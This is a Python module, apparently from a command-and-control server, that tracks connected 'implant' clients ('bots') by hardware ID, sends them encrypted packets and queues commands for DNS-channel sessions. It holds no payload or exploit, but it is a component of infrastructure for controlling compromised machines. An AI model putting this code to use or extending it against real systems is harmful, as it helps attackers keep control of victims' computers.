"""In-memory registry of connected implant clients."""

import asyncio
import logging
import time

from .protocol import write_packet

logger = logging.getLogger(__name__)


class ClientConnection:
    """Represents an active connection to an implant."""

    def __init__(self, hwid: str, addr, reader, writer, crypto):
        self.hwid = hwid
        self.addr = addr
        self.reader = reader
        self.writer = writer
        self.crypto = crypto
        self.session_id = ""
        self.info: dict = {}
        self.last_heartbeat: int = 0
        self.connected_at: int = int(time.time())


class Registry:
    """Thread-safe registry of connected clients."""

    def __init__(self):
        self._clients: dict[str, ClientConnection] = {}
        self._lock = asyncio.Lock()
        self._dns_queues: dict[str, list] = {}
        self._dns_sessions: dict[str, dict] = {}

    async def register(self, conn: ClientConnection):
        """Register a new client connection."""
        async with self._lock:
            self._clients[conn.hwid] = conn
            logger.info(f"Registered bot: {conn.hwid} ({conn.info.get('hostname', '?')})")

    async def unregister(self, hwid: str):
        """Unregister a client connection."""
        async with self._lock:
            self._clients.pop(hwid, None)
            logger.info(f"Unregistered bot: {hwid}")

    async def get(self, hwid: str) -> ClientConnection | None:
        """Get a client by HWID."""
        async with self._lock:
            return self._clients.get(hwid)

    async def list_all(self) -> list[ClientConnection]:
        """List all connected clients."""
        async with self._lock:
            return list(self._clients.values())

    async def is_connected(self, hwid: str) -> bool:
        """Check if a bot is currently connected."""
        async with self._lock:
            return hwid in self._clients

    async def send_to(self, hwid: str, packet: dict) -> bool:
        """Send a packet to a specific client."""
        conn = await self.get(hwid)
        if conn is None:
            return False
        try:
            await write_packet(conn.writer, conn.crypto, packet)
            return True
        except Exception as e:
            logger.error(f"Send to {hwid} failed: {e}")
            return False

    @property
    def connected_count(self) -> int:
        """Number of connected clients."""
        return len(self._clients)

    def register_dns_session(self, session_id: str, bot_data: dict) -> None:
        self._dns_sessions[session_id] = bot_data

    def queue_dns_command(self, session_id: str, cmd: dict) -> None:
        self._dns_queues.setdefault(session_id, []).append(cmd)

    def pop_dns_command(self, session_id: str) -> dict | None:
        q = self._dns_queues.get(session_id, [])
        return q.pop(0) if q else None
